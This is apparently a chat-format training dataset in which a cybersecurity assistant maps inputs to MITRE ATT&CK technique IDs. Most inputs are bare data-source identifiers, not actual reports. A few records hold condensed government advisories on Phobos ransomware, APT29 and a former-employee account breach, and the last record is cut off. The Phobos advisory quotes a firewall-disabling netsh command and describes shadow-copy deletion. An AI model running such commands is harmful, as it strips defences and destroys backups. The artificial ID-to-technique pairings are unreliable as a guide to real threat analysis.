{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0026"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1550, T1558, T1649"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0015"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T0807, T0814, T0816, T0821, T0836, T0839, T0843, T0845, T0848, T0855, T0857, T0858, T0861, T0863, T0889, T1027, T1048, T1069, T1070, T1072, T1098, T1110, T1114, T1133, T1137, T1189, T1190, T1199, T1203, T1204, T1210, T1212, T1213, T1484, T1496, T1505, T1537, T1550, T1552, T1556, T1557, T1562, T1564, T1566, T1567, T1598, T1610, T1621, T1622, T1649, T1657"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0041"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1662"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0039"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T0836, T0843, T0848"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0037"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1588"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0025"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1562"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0010"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1048"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0017"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T0802, T0807, T0823, T0840, T0849, T0853, T0863, T0872, T0881, T0886, T0893, T1003, T1005, T1007, T1010, T1012, T1016, T1018, T1020, T1021, T1025, T1027, T1033, T1036, T1039, T1040, T1041, T1046, T1047, T1048, T1049, T1053, T1056, T1057, T1059, T1069, T1070, T1074, T1082, T1083, T1087, T1098, T1105, T1110, T1112, T1113, T1114, T1115, T1119, T1120, T1123, T1124, T1134, T1135, T1137, T1204, T1217, T1218, T1480, T1482, T1484, T1485, T1486, T1489, T1490, T1496, T1497, T1505, T1518, T1529, T1542, T1543, T1546, T1547, T1548, T1552, T1555, T1556, T1558, T1560, T1561, T1562, T1563, T1564, T1567, T1569, T1570, T1574, T1614, T1615, T1622, T1649, T1652, T1654, T1662"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0032"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1053, T1204, T1543, T1610"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0038"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: No known technique detected"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0016"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: No known technique detected"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0027"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1056, T1068, T1111, T1543, T1547, T1561, T1562"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0022"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T0802, T0846, T0863, T0888, T0893, T1003, T1005, T1018, T1020, T1025, T1033, T1039, T1041, T1048, T1074, T1087, T1091, T1114, T1119, T1187, T1217, T1539, T1552, T1555, T1558, T1567, T1649, T1654"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0018"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1562"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0001"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T0839, T0857, T1542, T1564"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0036"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: No known technique detected"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0007"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: No known technique detected"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0030"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1204, T1578"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0035"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: No known technique detected"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0008"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: No known technique detected"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0028"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T0823, T0859, T0886, T1003, T1021, T1078, T1114, T1199, T1213, T1538, T1550, T1556, T1563, T1606, T1621, T1649"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0004"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1588"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0011"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T0823, T0853, T0886, T1021, T1027, T1055, T1059, T1106, T1129, T1137, T1218, T1505, T1546, T1547, T1556, T1574, T1620"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0023"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1570"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0033"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: No known technique detected"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0029"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: No known technique detected"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0040"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T0816, T0821, T0836, T0839, T0843, T0848, T0857, T0858, T0889"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0021"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: No known technique detected"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0014"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1610"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0009"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T0834, T0840, T0872, T0881, T0893, T1003, T1005, T1007, T1010, T1012, T1016, T1027, T1033, T1036, T1049, T1055, T1056, T1057, T1059, T1069, T1070, T1082, T1083, T1087, T1106, T1111, T1112, T1113, T1115, T1120, T1123, T1124, T1129, T1134, T1135, T1218, T1480, T1482, T1489, T1497, T1518, T1542, T1543, T1546, T1547, T1548, T1555, T1556, T1562, T1564, T1574, T1614, T1620, T1622, T1652"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0003"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: No known technique detected"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0012"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T0802, T0840, T0853, T0893, T1005, T1016, T1020, T1027, T1056, T1059, T1119, T1140, T1482, T1556, T1560, T1562, T1564, T1615, T1620"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0013"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1496, T1529, T1562"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0019"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T0849, T1036, T1543, T1557, T1564, T1569"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0020"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1537, T1578"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0002"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T0859, T1070, T1078, T1110, T1119, T1212, T1538, T1550, T1552, T1556, T1606, T1621"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0042"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1662"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0034"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1578"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0006"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1606"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0024"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1003, T1012, T1033, T1552, T1614, T1649, T1652"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: ds0005"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1021, T1027, T1047, T1546"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: actions take today mitigate phobos ransomware activity secure rdp ports prevent threat actors abusing leveraging rdp tools prioritize remediating known exploited vulnerabilities implement edr solutions disrupt threat actor memory allocation techniques summary note joint cybersecurity advisory csa part ongoingstopransomwareeffort publish advisories network defenders detail various ransomware variants ransomware threat actors stopransomware advisories include recently historically observed tactics techniques procedures ttps indicators compromise iocs help organizations protect ransomware visit stopransomwaregov see stopransomware advisories learn ransomware threats nocost resources federal bureau investigation fbi cybersecurity infrastructure security agency cisa multistate information sharing analysis center msisac releasing joint csa disseminate known ttps iocs associated phobos ransomware variants observed recently february 2024 according open source reporting phobos structured ransomwareasaservice raas model since may 2019 phobos ransomware incidents impacting state local tribal territorial sltt governments regularly reported msisac incidents targeted municipal county governments emergency services education public healthcare critical infrastructure entities successfully ransom several million us dollars12 fbi cisa msisac encourage organizations implement recommendations mitigations section csa reduce likelihood impact phobos ransomware ransomware incidents download pdf version report aa24060a stopransomware phobos ransomware pdf 67884 kb downloadable copy indicators compromise iocs see aa24060a stix xml xml 14773 kb aa24060a stix json json 11953 kb technical details note advisory uses mitre attck enterprise framework version 14 see mitre attck tactics techniques section table threat actors activity mapped mitre attck tactics techniques assistance mapping malicious cyber activity mitre attck framework see cisa mitre attcks best practices mitre attck mapping cisas decider tool overview according open source reporting phobos ransomware likely connected numerous variants including elking eight devos backmydata faust ransomware due similar ttps observed phobos intrusions phobos ransomware operates conjunction various open source tools smokeloader cobalt strike bloodhound tools widely accessible easy use various operating environments making associated variants popular choice many threat actors34 reconnaissance initial access phobos actors typically gain initial access vulnerable networks leveraging phishing campaigns drop hidden payloads using internet protocol ip scanning tools angry ip scanner search vulnerable remote desktop protocol rdp ports leveraging rdp microsoft windows environments56 discover exposed rdp service actors use open source brute force tools gain access phobos actors gain successful rdp authentication targeted environment perform open source research create victim profile connect targeted ip addresses associated companies threat actors leveraging phobos notably deployed remote access tools establish remote connection within compromised network7 alternatively threat actors send spoofed email attachments embedded hidden payloads smokeloader backdoor trojan often used conjunction phobos smokeloaders hidden payload downloaded onto victims system threat actors use malwares functionality download phobos payload exfiltrate data compromised system execution privilege escalation phobos actors run executables like 1saasexe cmdexe deploy additional phobos payloads elevated privileges enabled additionally phobos actors use previous commands perform various windows shell functions windows command shell enables threat actors control various aspects system multiple permission levels required different subsets commands8 smokeloader deployment phobos operations feature standard three phase process decrypt payload allows threat actors deploy additional destructive malware9 first phase smokeloader manipulates either virtualalloc virtualprotect api functionswhich opens entry point enabling code injected running processes allowing malware evade network defense tools second phase stealth process used obfuscate command control c2 activity producing requests legitimate websites10 within phase shellcode also sends call entry point memory container prepares portable executable deployment final stage finally smokeloader reaches third stage unpacks programerase cycle stored memory sent extracted sha 256 hash payload7 following successful payload decryption threat actors begin downloading additional malware additional phobos defense evasion capabilities phobos ransomware actors observed bypassing organizational network defense protocols modifying system firewall configurations using commands like netsh firewall set opmode modedisable additionally phobos actors evade detection using following tools universal virus sniffer process hacker powertool persistence privilege escalation according open source reporting phobos ransomware uses commands execexe bcdeditexe control mechanism phobos also observed using windows startup folders run registry keys cusersadminappdatalocaldirectory maintain persistence within compromised environments5 additionally phobos actors observed using builtin windows api functions steal tokens bypass access controls create new processes escalate privileges leveraging sedebugprivilege process phobos actors attempt authenticate using cached password hashes victim machines reach domain administrator access discovery credential access phobos actors additionally use open source tools asbloodhound sharphound enumerate active directory mimikatz nirsoft well remote desktop passview export browser client credentials also used furthermore phobos ransomware able enumerate connected storage devices running processes encrypt user files exfiltration phobos actors observed using winscp megaio file exfiltration11 use winscp connect directly victim network ftp server control phobos actors install megaio use export victim files directly cloud storage provider data typically archived either rar zip file later exfiltrated target legal documentation financial records technical documents including network architecture databases commonly used password management software impact exfiltration phase phobos actors hunt backups use vssadminexe windows management instrumentation commandline utility wmic discover delete volume shadow copies windows environments prevents victims recovering files encryption taken place phobosexe contains functionality encrypt connected logical drives target host phobos ransomware executable unique build identifiers ids affiliate ids well unique ransom note embedded executable ransom note populated infected workstations phobos ransomware continues search encrypt additional files extortion occurs via email however affiliate groups used voice calls contact victims cases phobos actors used onion sites list victims host stolen victim data phobos actors use various instant messaging applications icq jabber qq communicate see figure 2 list email providers used following phobos affiliates devos eight elbie eking faust6 figure 1 phobos affiliate providers list indicators compromise iocs see table 1 6 iocs obtained cisa fbi investigations september november 2023 commands observed execution phobos encryption executable phobos encryption executable spawns cmdexe process executes commands listed table 1 respective windows system executables commands executed windows system volume shadow copies deleted windows firewall disabled additionally systems boot status policy set boot even errors boot process automatic recovery options like windows recovery environment winre disabled given boot entry systems backup catalog also deleted finally phobos ransom note displayed end user using mshtaexe disclaimer organizations encouraged investigate use iocs table 7 related signs compromise prior performing remediation actions disclaimer organizations encouraged investigate use file hashes tables 8 9 related signs compromise prior performing remediation actions mitre attck techniques see table 10 22 threat actor tactics techniques referenced advisory mitigations secure design default mitigations mitigations apply critical infrastructure organizations network defenders fbi cisa msisac recommend software manufacturers incorporate secure design default principles tactics software development practices limiting impact ransomware techniques thus strengthening secure posture customers information secure design see cisas secure design webpage joint guide fbi cisa msisac recommend organizations implement mitigations improve organizations cybersecurity posture actors activity mitigations align crosssector cybersecurity performance goals cpgs developed cisa national institute standards technology nist cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful threats tactics techniques procedures visit cisas crosssector cybersecurity performance goals information cpgs including additional recommended baseline protections secure remote access software applying recommendations joint guide securing remote access software implement application controls manage control execution software including allowlisting remote access programs application controls prevent installation execution portable versions unauthorized remote access software properly configured application allowlist solution block unlisted application execution allowlisting important antivirus solutions may fail detect execution malicious portable executables files use combination compression encryption obfuscation implement log collection best practices use intrusion detection systems defend threat actors manipulating firewall configurations early detectioncpg 2t implement edr solutions disrupt threat actor memory allocation techniques strictly limit use rdp remote desktop services rdp necessary rigorously apply best practices examplecpg 2w audit network systems using rdp close unused rdp ports enforce account lockouts specified number attempts apply phishingresistant multifactor authentication mfa log rdp login attempts disable commandline scripting activities permissionscpg 2n review domain controllers servers workstations active directories new andor unrecognized accountscpg 4c audit user accounts administrative privileges configure access controls according principle least privilege polpcpg 2e reduce threat credential compromise via following place domain admin accounts protected users group prevent caching password hashes locally refrain storing plaintext credentials scripts implement timebased access accounts admin level highercpg 2a 2e addition authoring authorities csa recommend network defenders apply following mitigations limit potential adversarial use common system network discovery techniques reduce impact risk compromise ransomware data extortion actors implement recovery plan maintain retain multiple copies sensitive proprietary data servers physically separate segmented secure location ie hard drive storage device cloud maintain offline backups data regularly maintain backup restoration daily weekly minimum instituting practice organization limits severity disruption business practicescpg 2r require accounts password logins eg service account admin accounts domain admin accounts comply nists standards developing managing password policies use longer passwords consisting least 15 characters 64 characters lengthcpg 2b store passwords hashed format using industryrecognized password managers add password user salts shared login credentials avoid reusing passwordscpg 2c implement multiple failed login attempt account lockoutscpg 2g disable password hints refrain requiring password changes frequently per yearnote nist guidance suggests favoring longer passwords instead requiring regular frequent password resets frequent password resets likely result users developing password patterns cyber criminals easily decipher require administrator credentials install software require phishingresistant multifactor authentication mfa services extent possible particularly webmail virtual private networks vpns accounts access critical systemscpg 2h segment networks prevent spread ransomware network segmentation help prevent spread ransomware controlling traffic flows betweenand access tovarious subnetworks restricting adversary lateral movementcpg 2f identify detect investigate abnormal activity potential traversal indicated ransomware networking monitoring tool aid detecting ransomware implement tool logs reports network traffic activity including lateral movement network endpoint detection response edr tools particularly useful detecting lateral connections insight common uncommon network connections hostcpg 3a install regularly update enable real time detection antivirus software hosts disable unused ports protocolscpg 2v consider adding email banner emails received outside organizationcpg 2m disable hyperlinks received emails ensure backup data encrypted immutable ie ensure backup data altered deleted covers entire organizations data infrastructurecpg 2k 2l 2r validate security controls addition applying mitigations fbi cisa msisac recommend exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory fbi cisa msisac recommend testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see tables 416 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process fbi cisa msisac recommend continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory resources stopransomwaregov wholeofgovernment approach gives one central location ransomware resources alerts resource mitigate ransomware attack cisa nsa fbi multistate information sharing analysis centers msisac joint stopransomware guide sltt organizations encouraged implement msisacs ransomware defenseindepth guidance nocost cyber hygiene services cyber hygiene services ransomware readiness assessment cisa known exploited vulnerabilities catalog cisa mitre best practices mitre attck mapping cisa decider tool cisa crosssector cybersecurity performance goals cisa secure design cisa implementing phishingresistant mfa cisa guide securing remote access software references1 privacy affairs moral 8base ransomware targets 2 new victims2 vmware 8base ransomware heavy hitting player3 infosecurity magazine phobos ransomware family expands new faust variant4 record hospitals offline across romania following ransomware attack platform5 comparitech phobos ransomware protect it6 cisco talos understanding phobos affiliate structure activity7 cisco talos deep dive phobos ransomware recently deployed 8base group8 malwarebytes labs deep dive phobos ransomware9 run smokeloader10 malpedia smokeloader11 trueseca case faust ransomware12virustotal phobos domain 113 virustotal phobos executable ahpdateexe14 virustotal phobos gui extension elf file15 virustotal phobos ip address 185202011116 virustotal phobos gui extension binary file17cisco talos github iocs202311deepdiveintophobosransomwaretxt main reporting fbi seeking information shared include boundary logs showing communication foreign ip addresses sample ransomnote communications phobos actors bitcoin wallet information decryptor files andor benign sample encrypted file additional details requested include targeted company point contact status scope infection estimated loss operational impact transaction ids date infection date detected initial attack vector host networkbased indicators fbi cisa encourage paying ransom payment guarantee victim files recovered furthermore payment may also embolden adversaries target additional organizations encourage criminal actors engage distribution ransomware andor fund illicit activities regardless whether organization decided pay ransom fbi cisa urge promptly report ransomware incidents fbi internet crime complaint center ic3 local fbi field office cisa reportcisagov calling 1844saycisa 18447292472 disclaimer fbi conduct investigative activities base attribution solely activities protected first amendment company obligation respond provide information back fbi response engagement reviewing information company decides provide referral information fbi must manner consistent federal law fbi request expect company take particular action regarding information holding confidence due sensitive nature information report provided informational purposes fbi cisa endorse commercial product service including subjects analysis reference specific commercial products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring cisa fbi msisac acknowledgements california joint regional intelligence center jric ca israel national cyber directorate incd contributed csa version history february 29 2024 initial version product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1003.001, T1003.005, T1027.002, T1047, T1048, T1057, T1059.003, T1071.002, T1078, T1082, T1083, T1087.002, T1105, T1106, T1110, T1133, T1140, T1204.002, T1218.005, T1219, T1486, T1490, T1547.001, T1555, T1555.003, T1560, T1562, T1562.004, T1566.001, T1567.002, T1588.002, T1593, T1598, T1657"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: svrattributed actors adapting move government corporations cloud infrastructure overview advisory details recent tactics techniques procedures ttps group commonly known apt29 also known midnight blizzard dukes cozy bear uk national cyber security centre ncsc international partners assess apt29 cyber espionage group almost certainly part svr element russian intelligence services us national security agency nsa us cybersecurity infrastructure security agency cisa us cyber national mission force cnmf federal bureau investigation fbi australian signals directorates australian cyber security centre asds acsc canadian centre cyber security cccs new zealand government communications security bureau gcsb agree attribution details provided advisory advisory provides overview ttps deployed actor gain initial access cloud environment includes advice detect mitigate activity download pdf version report click previous actor activity ncsc previously detailed russian foreign intelligence service svr cyber actors targeted governmental think tank healthcare energy targets intelligence gain observed svr actors expanding targeting include aviation education law enforcement local state councils government financial departments military organizations svr actors also known supply chain compromise solarwinds software activity targeted organizations developing covid19 vaccine evolvingttps organizations continue modernize systems move cloudbased infrastructure svr adapted changes operating environment move beyond traditional means initial access exploiting software vulnerabilities onpremises network instead target cloud services access majority victims cloud hosted network actors must first successfully authenticate cloud provider denying initial access cloud environment prohibit svr successfully compromising target contrast onpremises system network typically exposed threat actors describes detail svr actors adapting continue cyber operations intelligence gain ttps observed last 12 months access via service dormant accounts previous svr campaigns reveal actors successfully used brute forcing password spraying access service accounts type account typically used run manage applications services human user behind easily protected multifactor authentication mfa making accounts susceptible successful compromise service accounts often also highly privileged depending applications services theyre responsible managing gaining access accounts provides threat actors privileged initial access network launch operations svr campaigns also targeted dormant accounts belonging users longer work victim organization whose accounts remain system following enforced password reset users incident svr actors also observed logging inactive accounts following instructions reset password allowed actor regain access following incident response eviction activities cloudbased token authentication account access typically authenticated either username password credentials systemissued access tokens ncsc partners observed svr actors using tokens access victims accounts without needing password default validity time systemissued tokens varies dependent system however cloud platforms allow administrators adjust validity time appropriate users information found mitigations section advisory enrolling new devices cloud multiple occasions svr successfully bypassed password authentication personal accounts using password spraying credential reuse svr actors also bypassed mfa technique known mfa bombingor mfa fatigue actors repeatedly push mfa requests victims device victim accepts notification actor bypassed systems gain access cloud environment svr actors observed registering device new device cloud tenant device validation rules set svr actors successfully register device gain access network configuring network device enrollment policies instances measures defended svr actors denied access cloud tenant residential proxies networklevel defenses improve detection suspicious activity svr actors looked ways stay covert internet ttp associated actor use residential proxies residential proxies typically make traffic appear originate ip addresses within internet service provider isp ranges used residential broadband customers hide true source make harder distinguish malicious connections typical users reduces effectiveness network defenses use ip addresses indicators compromise important consider variety information sources application hostbased logging detecting suspicious activity conclusion svr sophisticated actor capable carrying global supply chain compromise 2020 solarwinds however guidance advisory shows strong baseline cyber security fundamentals help defend actors organizations moved cloud infrastructure first line defense actor svr protect svrs ttps initial access following mitigations outlined advisory organizations stronger position defend threat svr gain initial access actor capable deploying highly sophisticated post compromise capabilities magicweb reported 2022 therefore mitigating svrs initial access vectors particularly important network defenders cisa also produced guidance secure cloud business applications scuba project designed protect assets stored cloud environments ttps listed report residential proxies exploitation system accounts similar reported recently january 2024 microsoft mitre attck report compiled respect mitre attck framework globally accessible knowledge base adversary tactics techniques based realworld observations mitigation detection number mitigations useful defending activity described advisory use multifactor authentication 2factor authenticationtwostep verification reduce impact password compromises see ncsc guidance multifactor authentication online services andsetting 2step verification 2sv accounts use 2sv strong unique passwords user system accounts disabled longer required joiners movers leavers process place regular reviews identify disable inactivedormant accounts see ncsc guidance10 steps cyber security system service accounts implement principle least privilege providing tightly scoped access resources required service function canary service accounts created appear valid service accounts never used legitimate services monitoring alerting use account provides high confidence signal used illegitimately investigated urgently session lifetimes kept short practical reduce window opportunity adversary use stolen session tokens paired suitable authentication method strikes balance regular user authentication user experience ensure device enrollment policies configured permit authorized devices enroll use zerotouch enrollment possible selfenrollment required use strong form 2sv resistant phishing prompt bombing old devices prevented reenrolling longer required see ncsc guidancedevice security guidance consider variety information sources application events hostbased logs help prevent detect investigate potential malicious behavior focus information sources indicators compromise better rate false positives example looking changes user agent strings could indicate session hijacking may effective trying identify connections suspicious ip addresses see ncsc guidanceintroduction logging security purposes disclaimer report draws information derived ncsc industry sources ncsc findings recommendations made provided intention avoiding risks following recommendations remove risk ownership information risks remains relevant system owner times information exempt freedom information act 2000 foia may exempt uk information legislation refer foia queries ncscinfolegncscgovuk material uk crown copyright product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1078.004, T1090.002, T1110, T1528, T1621"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: actions take today mitigate malicious cyber activity continuously remove disable accounts groups enterprise longer needed especially privileged accounts enable enforce multifactor authentication strong passwords store credentials secure manner credential manager vault privilege account management solution summary cybersecurity infrastructure security agency cisa multistate information sharing analysis center msisac conducted incident response assessment state government organizations network environment documents containing host user information including metadata posted dark web brokerage site analysis confirmed unidentified threat actor compromised network administrator credentials account former employeea technique commonly leveraged threat actorsto successfully authenticate internal virtual private network vpn access point navigate victims onpremises environment execute various lightweight directory access protocol ldap queries domain controller1 analysis also focused victims azure environment hosts sensitive systems data well compromised onpremises environment analysis determined indications threat actor compromised organization moving laterally onpremises environment azure environment cisa msisac releasing cybersecurity advisory csa provide network defenders tactics techniques procedures ttps used threat actor methods protect similar exploitation unnecessary privileged accounts download pdf version report aa24046a threat actor leverages compromised account former employee access state government organization pdf 49999 kb technical details note advisory uses mitre attck enterprise framework version 14 see mitre attck tactics techniques section table threat actors activity mapped mitre attck tactics techniques assistance mapping malicious cyber activity mitre attck framework see cisa mitre attcks best practices mitre attck mapping cisas decider tool overview state government organization notified documents containing host user information including metadata posted dark web brokerage site investigation victim organization determined documents accessed via compromised account former employee threat actors commonly leverage valid accounts including accounts former employees properly removed active directory ad gain access organizations1 cisa msisac assessed unidentified threat actor likely accessed documents containing host user information post dark web profit gaining access account former employee scope investigation included victim organizations onpremises environment well azure environment hosts sensitive systems data analysis determined threat actor move laterally compromised onpremises network azure environment compromise sensitive systems untitled goose tool incident responders collected azure microsoft defender endpoint mde logs using cisas untitled goose toola free tool help network defenders detect potentially malicious activity microsoft azure azure active directory aad microsoft 365 m365 environments cisa developed untitled goose tool export review aad signin audit logs m365 unified audit logs ual azure activity logs mde data exporting cloud artifacts untitled goose tool supports incident response teams environments ingest logs security information event management siem tool threat actor activity logs revealed threat actor first connected unknown virtual machine vm victims onpremises environment via internet protocol ip addresses within internal vpn range cisa msisac assessed threat actor connected vm victims vpn intent blend legitimate traffic evade detection initial access compromised domain accounts user1 threat actor gained initial access compromised account former employee administrative privileges user1 conduct reconnaissance discovery activities victim organization confirmed account disabled immediately following employees departure threat actor likely obtained user1 account credentials separate data breach due credentials appearing publicly available channels containing leaked account information user1 access two virtualized servers including sharepoint workstation former employee workstation virtualized physical workstation using veeam physical virtual p2v function within backup software user2 threat actor likely obtained user2 account credentials virtualized sharepoint server managed user1 